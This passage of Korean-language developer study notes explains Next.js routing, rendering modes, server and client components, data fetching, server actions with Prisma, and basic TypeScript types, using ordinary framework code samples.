6. 추가적인 데이터를 페이지로 주입시켜주는게 가능하다.
7. 글로벌 CSS를 이곳에 선언한다.

- `_app.tsx`의 props

1. Component : 페이지에 보여줄 컴포넌트, 페이지 전환 시 이 props의 값이 변경된다.
2. pageProps : 데이터패칭 메소드를 통해 가져온 초기 객체

- `_document.js` : https://nextjs.org/docs/advanced-features/custom-document#caveats

1. nextJs에서 제공하는 document를 커스터마이징 할 수 있다.
2. nextJs 페이지들은 마크업 정의를 건너뛰기 때문에 html, head, body 등을 수정할 때는 해당 파일을 사용해야한다.
3. 서버에서만 작동하고 onClick과 같은 이벤트나, CSS 스타일 파일은 작동하지 않는다.
4. pages 디렉토리 하위에 `_document.js` 파일 생성 -> 상단 url 내부 코드 복사 -> 커스텀

- Head 컴포넌트

1. 해당 컴포넌트를 추가한 뒤 컴포넌트 자식으로 title과 같은 태그 및 meta태그 등 head안에 작성할 내용들을 작성할 수 있다.

- 다이나믹 라우트

1. pages 디렉토리 하위에 디렉토리 생성 후 `[id].tsx` 파일을 생성하여 다이나믹 라우트 경로를 생성해준다.
2. 이동시킬 페이지에서 Link 태그를 import 하여 생성해놓은 다이나믹 라우트 경로로 이동시킬 수 있다. 예를 들어 view 디렉토리 하위에 `[id].tsx`파일을 생성해놓았다고 가정하여 “http://localhost:3000/view/랜덤쿼리”와 같은 주소로 이동시켜야한다고 할 떄 Link태그의 href 경로를 `/view/${id}`와 같이 설정하여 이동시킬 수 있다. (https://nextjs.org/docs/api-reference/next/link)
3. 페이지 이동 후 해당 페에지에 맞는 데이터를 받아오기 위해 useRouter hook을 사용하여 url의 쿼리 값을 가져올 수 있다. 쿼리 값을 가져온 뒤 해당 쿼리 값을 사용하여 원하는 데이터 api를 요청할 수 있다. (https://nextjs.org/docs/routing/dynamic-routes)

- Next js는 기본적으로 모든 페이지를 사전 렌더링 (Pre-rendering), 사전 렌더링의 방식은 두 가지가 있다.

1. 정적 생성
2. 서버사이드렌더링 (SSR, 다이나믹 렌더링)
   두 가지의 차이점은 언제 html 파일을 생성하는가이다.

- [1] 정적 생성의 경우

1. 프로젝트가 빌드하는 시점에 html 파일들이 생성
2. 모든 요청에 재사용
3. 퍼포먼스 이유로 next js는 정적 생성을 권고
4. 정적 생성된 페이지들은 cdn에 캐시
5. getStaticProps / getStaticPaths
6. 유저가 요청하기 전 미리 페이지를 만들어놓아도 상관없다면 정적 생성을 사용하면 된다. 예를 들면 제품 리스트, 마케팅 페이지, 블로그 게시물, 도움말 문서 등이 있다.

- [2] 서버 사이드 렌더링의 경우

1. 매 요청마다 html을 생성
2. 항상 최신 상태 유지
3. getServerSideProps

- Nextjs에서 a태그를 사용하지 않고 Link 태그 사용 이유

1. Link 태그 사용 시 페이지가 새로고침 되지 않는다. 내용물만 바뀌게 된다.
2. location 혹은 a 태그 사용 시 페이지가 새로고침 되면서 이동된다. 즉 요청이 늘어나게 된다. spa의 장점이 사라지게 되는 것이다. 만약 전역 상태 관리를 하였다면 상태가 다 초기화된다.

- 404에러 페이지

1. pages 디렉토리 하위에 404.js 생성한다.
2. 404 에러 시 보여 줄 컴포넌트 생성하면 끝
3. 500에러 페이지에서 한번에 처리할 수 있지만 404는 static으로 제공하는 것이 훨씬 좋다.

- 500에러

1. 500에러는 프로덕션 모드에서 확인해야함, 개발모드에서는 서버에러 발생 시 로그를 보여주기 때문에 프로덕션 모드에서 확인해야한다. 빌드 -> npm start하면 된다.
2. 그 후 해당 링크를 참고하여 작성하면 된다. https://nextjs.org/docs/advanced-features/custom-error-page#more-advanced-error-page-customizing 해당 링크처럼 작성하게 되면 404와 함께 반환할 페이지를 지정할 수 있다. (프론트/백 구분하여 에러페이지 반환)
3. 서버 에러 페이지는 정적으로 최적화되어있지 않는다. 서버 에러 페이지를 정적으로 제공하지 않는 이유는 에러 발생 시 서버 쪽으로 에러를 보내는 작업을 동반하는 경우가 많기 떄문이다. 어떤 에러다라는 것을 로그에도 남기고 리프팅하는 것이다.

- 환경 변수

1. node js 환경에서의 사용법 : process.env.변수명, getServerSideProps는 서버에서 동작하기 때문에 getServerSideProps 내부에서 이런 방식의 환경 변수를 사용할 수 있다.
2. browser 환경에서의 사용법 : rocess.env.NEXT*PUBLIC*변수명

- getStaticProps

1. Pre-rendering : 기본적으로 모든 페이지 pre-render 사전에 HTML 파일들을 만든다는 의미, 퍼포먼스 향상 및 SEO 유리 (초기 로딩 시 HTML먼저 띄운 후 js파일을 로드하여 실행한다)
2. 정적 생성은 빌드 시 HTML 파일을 생성하는 프리 렌더링 방식을 사용 -> 미리 렌더링 된 HTML을 사용자가 요청할 때 마다 넘겨주게 된다.
3. 반면 서버사이드 렌더링 방식은 사용자가 요청하면 HTML을 생성 후 보여준다.
4. 정적 생성은 페이지를 빌드 시점에 페이지를 생성하고 CDN을 통해 재사용하기 때문에 대부분의 상황에서 서버 사이드 렌더링보다 빠르고 좋다. (정적 생성 : 마케팅 페이지, 블로그 게시물, 제품 목록, 도움말 및 문서 등과 같이 요청 전 미리 만들어놓아도 되는 경우 사용 / 서버사이드렌더링 : 항상 최신 상태 유지, 관리자 페이지, 분석 차트 등 항상 최신 상태를 유지해야하는 경우 사용)
5. 정적 생성은 빈 화면을 그린 후 api 호출로 데이터가 채워지는 것이 아니라 미리 만들어진 static HTML을 제공하는 것이다.
6. getStaticProps을 통해 가져온 데이터가 포함된 static HTML은 빌드 후에 생성되어지는 .next 디렉토리 -> server 디렉토리에서 확인해볼 수 있다. 이 디렉토리 내부에는 서버에서 사용되는 static한 파일들이 있다. 여기서 getStaticProps을 통해 가져온 데이터가 포함된 static HTML 내부를 확인해보면 데이터가 모두 채워져있는 것을 확인할 수 있다. 즉 빌드 시점에 데이터가 모두 포함 된 static HTML이 제공되는 것이다.

- getStaticPaths

1. 다이나믹 라우팅의 경우 어떤 path값이 들어올 지 알 수 없기 때문에 정적인 상태로 제공하기 어렵다. (모든 path값에 따른 상세 페이지를 생성해놓을 수가 없다) 하지만 데이터의 갯수가 한정적이고 그 데이터의 값을 미리 알 수 있는 경우 가능하다. 이 때 getStaticPaths를 사용한다.
2. getStaticPaths는 항상 getStaticProps와 함께 사용된다. getStaticPaths의 전달하는 값은 paths와 fallback이 있다.
3. paths는 페이지를 미리 생성할 데이터를 지정할 수 있다. (ex paths: [{ params: { id: '740' } }, { params: { id: '730' } }, { params: { id: '729' } }]), 이 때 실제로는 고정적으로 지정해서 하는 경우는 거의 없다. 왜냐하면 데이터 변경 시 순서가 밀리거나 바뀔 수 있기 때문이다. 그렇기 때문에 getStaticPaths 내부에서 데이터를 받아온 뒤 map, slice등 관련 메소드를 활용하여 데이터를 가공하는 방식으로 지정한다.
4. fallback은 boolean값을 활용한다. paths에 할당되어 진 경로의 페이지가 아닌 경우 접근 시 false일 경우 없는 페이지 대응을 하지 않아 404에러가 발생한다. true로 설정할 경우 대응하기 때문에 지정하지 않은 페이지도 정상적으로 작동한다. 즉 true로 설정할 경우 getStaticPaths로 전달 된 경로들은 빌드 타임에 생성되는 것은 맞지만 나머지들은 최초 접속 시 props가 빈 상태로 그려진 후 이후 백그라운드에 정적 파일로 html과 js를 생성한다. 그다음 next js는 프리 렌더링 목록에 해당 페이지를 추가한다. 두번째 접속 시 부터는 프리렌더링 목록에 추가되어 정적 파일이 생성되었기 때문에 빠르다. fallback true는 페이지가 굉장히 많을 경우 사용한다. 이렇게 사용할 경우 빌드 타임이 늘어나 최초로 접속하는 사용자는 빈 화면을 잠깐 볼 수 있지만 이후 접속하는 나머지 사용자들은 빠르게 이용할 수 있다.
5. Link 태그의 prefetch 속성 (https://nextjs.org/docs/api-reference/next/link)을 사용하는 경우 모든 데이터들의 경로를 정적 파일로 생성해놓을 수 있다. 이 속성을 활용하면 첫 화면이나 스크롤했을 때 그 뷰포트 내부에 있는 링크들은 모두 프리로드가 된다. 즉 정적 생성이 된다.

- useRouter의 isFallback

1. getStaticProps, getStaticPaths의 경우 dev 환경으로 실행 시 요청할 때마다 호출이 되기 때문에 dev 환경으로 디버깅 하는 것이 편하다. (yarn dev) 즉 getStaticProps, getStaticPaths로 불러온 데이터에 접근 시 페이지 새로고침할 때마다 빈 화면 생성 후 데이터가 추가되는 것을 볼 수 있는데 매번 호출되어 요청하기 때문이다. production 환경에서는 프리렌더링 목록에 추가하기 때문에 이렇게 되지 않는다.
2. useRouter가 반환하는 객체의 isFallback은 해당 path에 맞는 데이터가 처리되지 않았을 경우 true를 반환하고 처리된 경우 false를 반환한다. 이것을 활용하여 true일 경우 로딩 화면을 생성할 수 있다.

- Dynamic API

1. cna로 자동 프로젝트를 생성하면 pages 디렉토리 하위에 api 디렉토리가 있는데 내부에 있는 hello라는 샘플 파일이 있다. http://localhost:3000/api/hello 로 접속해보면 json을 반환하는 것을 알 수 있다. 이것과 같은 형태를 활용하여 다이나믹 API를 생성할 수 있다.
2. api 디렉토리 하위에 다이나믹 라우팅과 같은 구조를 생성하여 하위 처럼 작성한다.

```ts
export default function handler(req, res) {
  res.status(200).json({ name: req.query.id }); // 여기서 req.query.id는 URl의 query를 가져올 수 있다.
}
```

<br>
<br>
<br>

## # Next.js(13버전 이후)

### # 클라이언트 컴포넌트와 서버 컴포넌트

- 클라이언트 컴포넌트와 서버 컴포넌트로 나뉜 이유

  | 기존 문제                       | 해결 방식 (RSC)                                         |
  | ------------------------------- | ------------------------------------------------------- |
  | 중첩 fetch 지연 (waterfall)     | 서버에서 직접 빠르게 fetch                              |
  | 클라이언트로 쓸데없는 코드 전송 | 서버에서만 실행되므로 번들에서 제외됨                   |
  | 서버와 클라이언트 코드 뒤섞임   | 명확한 `use client` / `use server` 선언으로 관심사 분리 |
  | 페이지 단위 SSR만 가능          | 컴포넌트 단위 SSR 가능                                  |
  | 클라이언트가 DB 접근 불가       | 서버 컴포넌트가 DB 직접 접근                            |

- 클라이언트 컴포넌트

  - 역할

    - 사용자와의 상호작용을 담당하는 컴포넌트

    - 브라우저에서 실행되며, React의 클라이언트 기능(예: useState, useEffect) 사용 가능

  - 렌더링 과정

    1. 초기 요청/새로고침 시 서버에서 SSR(HTML 렌더링)로 정적인 HTML과 하이드레이션에 활용될 JS 번들을 클라이언트로 전달, 클라이언트는 그 HTML을 하이드레이션(이벤트 연결)하여 상호작용할 수 있도록 만든다.

    2. 클라이언트 사이드 라우팅 이후에는 CSR로 렌더링됨 (JS만 다운로드, HTML은 재사용), 클라이언트 컴포넌트는 React Element 객체(JSX로 작성된 React 컴포넌트)를 반환하며, 해당 객체는 Virtual DOM에 Fiber로 확장된다. 이후, Fiber를 통해 Virtual DOM을 생성하고, 이를 바탕으로 실제 DOM을 변환한다.

  - 언제 사용하나요?

    - 상태 관리, 이벤트 핸들링, 애니메이션 등 동적인 UI가 필요할 때

    - 브라우저 API를 사용할 때

  - 사용 방법

    - 최상단 'use client' 표시

- 서버 컴포넌트

  - 역할

    - 제로 번들 사이즈 컴포넌트, 즉 JS 번들에 포함되지 않음. 클라이언트에 정적인 HTML만 전달

    - 서버에서 데이터 fetching을 처리하여, API나 데이터베이스와 연결하고, 서버에서 데이터를 미리 가져와 HTML을 생성

    - React 내장 훅 (useState, useEffect), 이벤트 핸들링 불가

  - 렌더링 과정 (초기 페이지 요청 시)

    - 서버 측

      1. react server에서 서버 컴포넌트를 렌더링하여 직렬화한 RSC Payload 생성

         - RSC Payload에 포함되는 정보

           - 서버 컴포넌트의 JSX 렌더링 결과 (HTML이 아니라 직렬화된 데이터)

           - 클라이언트 컴포넌트가 리액트 컴포넌트 트리 내에 들어갈 위치를 표시하는 placeholder (서버 컴포넌트는 클라이언트 컴포넌트를 포함이 가능하므로, 해당 클라이언트 컴포넌트와 그에 필요한 자원을 응답받아야 하기 때문에 이를 기억)

           - 서버 컴포넌트가 클라이언트 컴포넌트에 넘기는 props 정보

      2. nextjs server에서 RSC Payload를 기반으로 정적인 HTML을 생성하고 브라우저로 전달 (초기 페이지 요청이 아닌 경우에는 RSC payload를 브라우저로 전달, react runtime이 이를 해석해서 렌더링)

    - 클라이언트 측

      3. 브라우저는 서버에서 생성한 HTML을 전달받아 즉시 보여준다.

      4. 이 때 HTML 내 클라이언트 컴포넌트의 placeholder가 표시되어 있다면 RSC payload에 placeholder, props를 활용하여 재조정(reconcile) 및 하이드레이션(수화)한다. (재조정 : 클라이언트 컴포넌트와 서버 컴포넌트 트리를 구성하는데 이것이 리액트 컴포넌트 트리(버츄얼 돔)이며 이 리액트 컴포넌트 트리에서 클라이언트 컴포넌트 트리에 플레이스홀더를 RSC payload에 포함되어있는 플레이스홀더 정보를 활용하여 채워주는데 이 과정을 재조정이라고 한다. 리액트 컴포넌트 트리(가상 돔)는 서버 컴포넌트가 뼈대를 이루는데, 이 때 하이드레이션이 필요한 위치를 표시하기 위해 RSC Payload 내 정보를 활용한다고 이해했다. / 하이드레이션 : 재조정을 통해 버츄얼 돔 클라이언트 컴포넌트 트리에 빈자리를 채운 뒤 인터렉션이 가능하도록 하이드레이션(수화)한다.)

  - 언제 사용하나?

    - 비상호작용 콘텐츠를 렌더링할 때

    - 서버 데이터 fetching 필요할 때

    - SEO 최적화를 고려할 때

    - JS 번들 사이즈 최소화를 원할 때

  - 사용 방법

    - 기본적으로 서버 컴포넌트로 동작함, 혹은 최상단 'use server' 표시

  - 결론

    - 서버 컴포넌트는 HTML만 생성, 하이드레이션 없음 → JS 번들에 포함되지 않음

    - 클라이언트 컴포넌트는 서버가 placeholder만 생성하고 브라우저가 해당 위치에 클라이언트 컴포넌트가 존재하는 겅우 JS 번들을 받아 실제 렌더링과 hydrate를 수행한다.

    - 서버 컴포넌트만 사용할 경우 → JS 없이도 콘텐츠 렌더링 가능 → SEO, 성능에 유리

    - 초기 페이지 요청 이후 탐색

      - 서버 컴포넌트

        - 클라이언트(브라우저)는 서버에 요청해서 RSC Payload를 받음.

        - 이 RSC를 React가 받아서 클라이언트에서 React DOM 트리로 렌더링한다.

      - 클라이언트 컴포넌트

        - 전적으로 클라이언트 측(브라우저)에서 렌더링, 서버 사이드 렌더링을 수행하지 않음

<br>

### # app router

- 기본 규칙

  page.tsx 파일은 하나의 라우트를 나타낸다

  - app/page.tsx : /
  - app/about/page.tsx : /about
  - app/blog/page.tsx : /blog
  - app/blog/post/page.tsx : /blog/post

- 동적 라우팅

  - app/blog/[slug]/page.tsx : /blog/hello-world
  - app/product/[id]/page.tsx : /product/123

- catch-all 라우팅 (모든 하위 경로 대응)

  - app/docs/[...slug]/page.tsx : /docs/a, /docs/a/b, /docs/a/b/c 등 모두 대응

- optional catch-all (없을 수도 있는 경로)

  - app/shop/[[...category]]/page.tsx : /shop, /shop/shoes, /shop/shoes/men

    - []: 동적

    - [[]]: 선택적 동적

- Route Groups ((폴더명))

  라우팅에 포함되지는 않지만 구조적으로 폴더를 나눠야 할 때 사용한다. 괄호는 URL 경로에 포함되지 않음

  - app/(admin)/dashboard/page.tsx : /dashboard

  - app/(user)/profile/page.tsx : /profile

- 병렬 라우트 (@폴더)

  하나의 URL 내에서 다수의 영역(UI Slot)을 관리할 수 있게 해준다.

  ```md
  app/
  ├── layout.tsx
  ├── @modal/
  │ └── login/page.tsx
  ├── @main/
  │ └── home/page.tsx
  ```

  예를 들어, /dashboard 페이지에서 왼쪽에는 nav 영역, 가운데에는 main 콘텐츠, 오른쪽에는 modal이 조건적으로 열리는 구조를 갖고 싶을 때 이 모든 UI를 하나의 트리에서 관리하면 복잡하고 유지보수가 어려워지기 때문이다.

  ```md
  app/
  ├── dashboard/
  │ ├── layout.tsx ← 병렬 슬롯 정의
  │ ├── @main/
  │ │ └── page.tsx ← 메인 콘텐츠
  │ ├── @nav/
  │ │ └── page.tsx ← 내비게이션
  │ └── @modal/
  │ └── login/page.tsx ← 모달 (optional)
  ```

  여기서 @main, @nav, @modal은 슬롯(slot) 이름이다.

  ```jsx
  // app/dashboard/layout.tsx
  export default function DashboardLayout({
    children, // @main 슬롯, 항상 기본적으로 @main 슬롯에 해당한다.
    nav, // @nav 슬롯
    modal, // @modal 슬롯
  }: {
    children: React.ReactNode,
    nav: React.ReactNode,
    modal: React.ReactNode,
  }) {
    return (
      <div className="dashboard">
        <aside>{nav}</aside>
        <main>{children}</main>
        {modal && <div className="modal">{modal}</div>}
      </div>
    );
  }
  ```

  예를 들어 /dashboard/login 페이지를 열면 @main/page.tsx → 렌더링, @modal/login/page.tsx → 렌더링, 즉, 모달은 @modal/login 경로로 분리되어 있지만, 여전히 /dashboard/login 이라는 하나의 URL에서 같이 보여질 수 있다.

  - React에서 단순 컴포넌트 분리 vs. Next.js 병렬 라우트

    React에서 그냥 컴포넌트를 잘게 쪼개는 것과의 차이점은 React의 컴포넌트 분리는 "디자인 시스템 단위 분리", Next.js 병렬 라우트는 "페이지 상태 단위 분리 (with URL과 서버)"이다.

    | 항목          | 일반 React 컴포넌트 분리            | Next.js 병렬 라우트                      |
    | ------------- | ----------------------------------- | ---------------------------------------- |
    | 분리 단위     | UI 컴포넌트 함수                    | URL 기반 슬롯 (@slot/)                   |
    | 렌더링 기준   | 부모 컴포넌트 렌더 시 함께 렌더링됨 | 각 슬롯이 독립적으로 렌더링됨            |
    | 라우팅 연결   | X (라우팅 직접 처리 필요)           | O (Next.js 라우팅 시스템이 처리)         |
    | 코드 스플리팅 | 명시적으로 lazy, suspense 등 사용   | 자동으로 코드 분할됨                     |
    | URL 상태 연동 | 수동 처리 (useState, useLocation)   | URL이 직접적으로 렌더링 상태를 제어      |
    | SEO 최적화    | 수동 처리                           | 슬롯별로 자동 SSR/SSG/ISR 등 최적화 가능 |
    | 상태 보존     | 부모 리렌더 시 초기화될 수 있음     | 슬롯 간 독립적으로 상태 유지             |

  - 병렬 라우트의 장점

    - UI 영역을 분리 : 각 UI 영역을 독립적인 디렉토리로 분리하여 유지보수 용이
    - 조건부 렌더링 : 모달이나 팝업 등을 URL에 기반해 제어 가능 (modal 슬록만 바꾸면 됨)
    - 상태 보존 : 각 슬롯은 상태를 별도로 유지하므로, 예: 메인 콘텐츠는 그대로 두고 모달만 교체 가능
    - 코드 분할 : 각 슬롯별로 코드 스플리팅 가능 → 성능 최적화

- 예외 처리

  특정 경로에 대한 예외 처리를 하는 방법이다.

  - not-found.tsx 해당 경로가 없을 때 렌더링

  - error.tsx 렌더링 중 에러 발생 시

  - loading.tsx 로딩 중일 때 표시되는 UI (e.g. Suspense 대체)

<br>

### # Layout 파일

- 정의

  layout.tsx는 특정 경로(/app/\*\*)에 공통적으로 적용될 레이아웃 UI를 정의하는 파일이다.

  ```jsx
  // app/layout.tsx
  export default function RootLayout({
    children,
  }: {
    children: React.ReactNode,
  }) {
    return (
      <html lang="en">
        <body>
          <Header />
          <main>{children}</main>
          <Footer />
        </body>
      </html>
    );
  }
  ```

- /app 디렉토리 내에는 반드시 하나의 layout.tsx가 있어야 함 (최상위 루트)

- 기본적으로 서버 컴포넌트이며, use client를 선언하지 않는 이상 서버에서 렌더링

- 폴더마다 layout.tsx를 추가하면 하위 페이지에 중첩되어 적용됨

  ```md
  app/
  ├── layout.tsx ← 모든 페이지에 적용 (루트 레이아웃)
  ├── dashboard/
  │ ├── layout.tsx ← dashboard 하위에만 적용되는 서브 레이아웃
  │ └── page.tsx
  └── about/
  └── page.tsx
  ```

  - /dashboard 접속 시: Root layout → Dashboard layout → Dashboard page

  - /about 접속 시: Root layout → About page

- 페이지 전환 시 layout.tsx는 다시 렌더링되지 않음 (유지됨)

- 라우팅해도 공통 요소(예: 사이드바)는 계속 유지되므로 상태 보존에 유리함

- layout.tsx는 반드시 html과 body를 포함하는 게 권장됨

<br>

### # 메타데이터(metadata)

- Nextjs 메타데이터

  페이지의 `<head>`에 들어가는 메타 정보를 정적 타입 기반으로 안전하고 쉽게 설정할 수 있도록 만든 Next.js 전용 API이다.

  - SEO (검색엔진 최적화)

  - OG (Open Graph, SNS 공유 미리보기)

  - Twitter 카드

  - favicon, theme color 등 브라우저 관련 설정

- 기본 사용법

  ```jsx
  // app/page.tsx

  export const metadata = {
    title: "홈페이지 - MyApp",
    description: "이곳은 MyApp의 홈페이지입니다.",
  };

  export default function HomePage() {
    return <h1>홈</h1>;
  }
  ```

  이 정보는 `<head>`에 자동 삽입

  ```html
  <title>홈페이지 - MyApp</title>
  <meta name="description" content="이곳은 MyApp의 홈페이지입니다." />
  ```

<br>

### # 데이터 패칭

nextjs에서는 데이터 패칭을 위해 내장 fetch API를 활용한다. (브라우저 API인 fetch와 다르다)

- 서버 컴포넌트에서의 fetch 사용

  ```js
  // app/page.tsx
  export default async function Page() {
    const res = await fetch("https://api.example.com/data");
    const data = await res.json();

    return (
      <ul>
        {data.map((item) => (
          <li key={item.id}>{item.title}</li>
        ))}
      </ul>
    );
  }
  ```

- fetch()의 캐싱 및 재검증 옵션

  Next.js는 fetch() 함수에 cache 및 next 옵션을 제공하여 캐싱 전략을 제어할 수 있다.​

  - fetch `cache: 'force-cache'`: 기본값으로, 빌드 시 데이터를 캐싱하여 정적 페이지를 생성합니다. (기존 getStaticProps와 유사)

    ```jsx
    // app/page.tsx
    export default async function Page() {
      const res = await fetch("https://api.example.com/products", {
        cache: "force-cache", // 👈 기본값이지만 명시적으로 설정
      });

      const products = await res.json();

      return (
        <ul>
          {products.map((p: any) => (
            <li key={p.id}>{p.name}</li>
          ))}
        </ul>
      );
    }
    ```

  - fetch `cache: 'no-store'`: 매 요청마다 데이터를 새로 가져와 SSR을 구현합니다. (기존 getServerSideProps와 유사)

    ```jsx
    // app/page.tsx
    export default async function Page() {
      const res = await fetch("https://api.example.com/products", {
        cache: "no-store", // 👈 SSR처럼 매번 새 요청
      });

      const products = await res.json();

      return (
        <ul>
          {products.map((p: any) => (
            <li key={p.id}>{p.name}</li>
          ))}
        </ul>
      );
    }
    ```

  - fetch `next: { revalidate: N(시간) }`: ISR(Incremental Static Regeneration)을 구현하여 N초마다 데이터를 재검증합니다.​ (기존 getStaticProps + revalidate와 유사)

    ```jsx
    // app/blog/[id]/page.tsx
    import { notFound } from "next/navigation";

    async function getPost(id: string) {
      const res = await fetch(`https://api.example.com/posts/${id}`, {
        next: { revalidate: 60 }, // 60초마다 재검증
      });
      if (!res.ok) return notFound();
      return res.json();
    }

    export default async function Page({ params }: { params: { id: string } }) {
      const post = await getPost(params.id);
      return (
        <article>
          <h1>{post.title}</h1>
          <p>{post.content}</p>
        </article>
      );
    }
    ```

- generateStaticParams : 동적 라우팅 시 프리렌더링을 목적으로 사용된다. (기존 getStaticPath와 유사)

  ```jsx
  // app/products/[id]/page.tsx
  // ✅ 여기에 선언해야 함 (컴포넌트 함수 바깥)
  export const dynamicParams = false; // 과거 fallback 속성, blocking의 경우 'force-dynamic'로 설정

  // 1. 프리빌드할 목록 지정
  export async function generateStaticParams() {
    return [{ id: "1" }, { id: "2" }];
  }

  // 2. 실제 페이지 렌더링
  export default async function ProductPage({
    params,
  }: {
    params: { id: string },
  }) {
    const product = await getProductById(params.id);
    return <div>{product.name}</div>;
  }
  ```

- Request Memoization

  - Request Memoization은 같은 URL과 동일한 fetch 옵션을 가진 여러 fetch() 호출이 있을 때, 중복된 네트워크 요청을 하나로 합쳐서 실행하는 기능입니다.

  - 즉, 한 페이지 내 여러 컴포넌트가 같은 API를 호출해도, 실제로는 한 번만 네트워크 요청이 발생하고, 그 결과를 공유합니다.

<br>

### # 서버 액션

- 개념

  - 서버 액션은 Next.js App Router에서 지원하는 기능으로, 서버에서만 실행되는 함수를 클라이언트에서 직접 호출하듯 사용할 수 있게 해줌.

  - 주로 use server 지시문을 붙인 함수가 이에 해당하며,

  - Next.js가 클라이언트 호출을 내부적으로 서버 요청으로 변환해서 처리한다.

  - 특히 폼 제출에서 `<form action={서버액션}>`처럼 선언적으로 사용 가능하며, 서버에서 DB 접근, 인증 처리, 비즈니스 로직 실행 등을 안전하게 수행할 수 있다.

- 장단점

  - 장점

    | 장점                           | 설명                                                      |
    | ------------------------------ | --------------------------------------------------------- |
    | API 라우트 불필요              | 별도의 API 엔드포인트 만들지 않아도 됨                    |
    | 타입 안정성                    | 함수 시그니처 기반으로 타입스크립트 타입 자동 보장        |
    | 간결한 코드                    | `fetch` 없이 마치 함수 호출하듯 서버 로직 실행 가능       |
    | 보안성                         | 서버에서만 실행되므로 클라이언트에 민감한 정보 노출 안 됨 |
    | 폼 제출과 자연스러운 통합      | `<form action={서버액션}>` 형태로 기본 폼 제출 활용 가능  |
    | 서버 컴포넌트와 함께 사용 가능 | 서버 컴포넌트 내 함수로 자연스럽게 조합 가능              |

  - 단점

  | 단점 / 제한                 | 설명                                                          |
  | --------------------------- | ------------------------------------------------------------- |
  | Next.js App Router 전용     | `/app` 디렉터리 기반 프로젝트에서만 가능                      |
  | 직접 API 호출 불가          | 내부적으로 자동 요청 처리, 수동으로 URL 호출 불가능           |
  | 클라이언트 사이드 호출 제한 | 서버 함수이므로 브라우저에서 직접 실행 안 됨                  |
  | 외부 API 호출 용도로 부적합 | 서버 내 비즈니스 로직 용도이며, 외부 API 호출엔 fetch 등 필요 |

- 예시

  1. prisma 스키마 정의

  ```js
  generator client {
    provider = "prisma-client-js"
  }

  datasource db {
    provider = "sqlite"
    url      = env("DATABASE_URL")
  }

  // 투두 스키마
  model Todos {
    id        Int      @id @default(autoincrement())
    title     String
    createTododAt DateTime @default(now())
  }
  ```

  2. 앱에서 사용할 prisma의 인스턴스를 생성

  ```javascript
  import { PrismaClient } from "@prisma/client";

  declare global {
    var prisma: PrismaClient | undefined;
  }

  const client = globalThis.prisma || new PrismaClient();

  if (process.env.NODE_ENV !== "production") globalThis.prisma = client;

  export default client;
  ```

  3. UI 및 서버 액션 정의하기 (폼 제출)

  ```jsx
  import { createTodo } from "@/action";

  const page = () => {
    return (
      <section className="px-16 py-12">
        <div className="container mx-auto flex flex-col gap-8">
          <h1 className="text-lg text-gray-900">Todos</h1>
          <form action={createTodo} className="flex max-w-sm flex-col gap-4">
            <input
              type="text"
              name="title"
              className="rounded-md border border-slate-300 px-2 py-1 outline-none"
              required
            />
            <button className="rounded-md bg-slate-300 py-2 hover:shadow-sm">
              submit
            </button>
          </form>
        </div>
      </section>
    );
  };
  export default page;
  ```

  ```js
  "use server";
  import client from "@/lib/prisma";

  export const createTodo = async (formData: FormData) => {
    const title = formData.get("title") as string;

    await client.todos.createTodo({
      data: {
        title,
      },
    });
  };
  ```

  4. 추가된 투두 가져오기

  ```js
  // ...

  export const getTodos = async () => {
    const todos = await client.todos.findMany();

    return todos;
  };
  ```

  ```tsx
  // 넥스트는 기본적으로 서버 컴포넌트이므로 컴포넌트 자체에서 비동기를 처리할 수 있습니다.
  import { createTodo, getTodos } from "@/action";

  const page = () => {
    const todos = await getTodos();

    return (
      <section className="px-16 py-12">
        <div className="container mx-auto flex flex-col gap-8">
          {/* ... */}

          <ul className="max-w-sm">
            {todos.map((todo) => (
              <li key={todo.id} className="mb-4 flex justify-between">
                {todo.title} <DeleteButton id={todo.id} />
              </li>
            ))}
          </ul>
        </div>
      </section>
    );
  };
  export default page;
  ```

- 관련 훅

  1. useFormStatus()

  서버 액션 실행 상태 추적을 위해 사용한다. pending 값을 통해 현재 서버 액션이 실행 중인지 알 수 있다. `<form>` 안에서만 작동하고, 서버 액션이 실행되는 동안 버튼 비활성화 등에 사용한다.

  ```tsx
  "use client";

  import { useFormStatus } from "react-dom";

  export function SubmitButton() {
    const { pending } = useFormStatus();

    return (
      <button type="submit" disabled={pending}>
        {pending ? "저장 중..." : "저장"}
      </button>
    );
  }
  ```

  2. useFormState()

  서버 액션 결과 상태 관리를 위해 사용한다. 서버 액션에 prevState와 formData를 넘겨줘서 서버에서 상태를 계산한 후 리턴. 폼 제출 후 결과 메시지나 에러 메시지 보여줄 때 유용

  ```tsx
  "use client";

  import { useFormState } from "react-dom";
  import { addTodo } from "../actions/addTodo";

  const initialState = { message: "" };

  export default function TodoForm() {
    const [state, formAction] = useFormState(addTodo, initialState);

    return (
      <form action={formAction}>
        <input name="title" />
        <button type="submit">추가</button>
        {state.message && <p>{state.message}</p>}
      </form>
    );
  }
  ```

  ```ts
  "use server";

  export async function addTodo(prevState: any, formData: FormData) {
    const title = formData.get("title")?.toString() || "";
    return { message: `${title} 추가됨` };
  }
  ```

<br><br><br>

## # Typescript

<br>

### # **타입스크립트**

<br>

- 타입스크립트란?

  타입스크립트는 자바스크립트의 슈퍼셋이다. 자바스크립트 기본 문법에 타입스크립트의 문법을 추가한 언어이다. 자바스크립트는 동적 언어로 런타임에 타입을 결정하는데 이와 같은 문제를 보완하고자 컴파일 타임에 타입을 결정하는 타입스크립트를 사용할 수 있다.

<br>

- 타입스크립트의 사용 이유

  (1) 안정성 향상 : 타입스크립트는 코드에 목적을 명시하고 목적에 맞지 않는 타입의 변수나 함수들에서 에러를 발생시켜 버그를 사전에 제거하여 안정성이 향상된다.

  (2) 더 나은 개발자 경험 제공 : 객체의 필드나 함수의 매개변수로 들어오는 값이 무엇인지 파악이 용이하고 변수의 이름뿐만 아니라 그 데이터의 타입까지 알 수 있게 해주기 때문에 코드 작성을 좀 더 쉽고 직관적이게 만들어준다.

  (3) 메모리 절약 : 타입의 유무로 메모리 사용량이 달라지기 때문에 메모리를 절약할 수 있다.

  (4) 크로스브라우징 문제 해결 : 타입스크립트는 컴파일 과정에서 ES6+ 문법들을 ES5(또는 ES3)로 바꿔주기 때문에 Babel의 도움 없이 구브라우저에도 대응 가능하다.

<br>

### # 타입스크립트 기본 타입

1. String : 문자열

   ```ts
   let str: string = "hi";
   ```

2. Number : 숫자

   ```ts
   let num: number = 10;
   ```

3. Boolean : 진위 값

   ```ts
   let isLoggedIn: boolean = false;
   ```

4. Array : 배열

   ```ts
   let arr: number[] = [1, 2, 3];
   let arr: Array<number> = [1, 2, 3]; // 제네릭 사용
